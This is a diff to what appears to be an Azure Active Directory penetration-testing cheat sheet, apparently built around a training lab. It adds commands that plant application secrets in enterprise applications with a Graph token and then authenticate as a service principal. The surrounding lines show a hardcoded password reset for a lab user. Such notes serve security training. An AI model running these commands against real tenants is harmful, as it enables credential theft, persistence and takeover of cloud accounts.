@@ -8,6 +8,7 @@
   * [Mimikatz](#Mimikatz)
   * [Powershell History](#Powershell-History)
 * [Reset password of other users](#Reset-password-of-other-users)
+* [Add credentials to enterprise applications](#Add-credentials-to-enterprise-applications)
 * [Arm Templates History](#Arm-Templates-History)
 * [Function apps continuous deployment](#Function-apps-continuous-deployment)
 
@@ -241,6 +242,25 @@ type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Con
 ```
 $password = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText –Force
 (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributorx@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $Password –Verbose
+```
+
+## Add credentials to enterprise applications
+#### Check if secrets (application passwords) can be added to all enterprise applications
+```
+. .\Add-AzADAppSecret.ps1
+Add-AzADAppSecret -GraphToken $graphtoken -Verbose
+```
+
+#### Use the secret to autheticate as service principal.
+```
+$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
+Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
+```
+
+### Check what resources service principal can access
+```
+Get-AzResource
 ```
 
 ## Arm Templates History
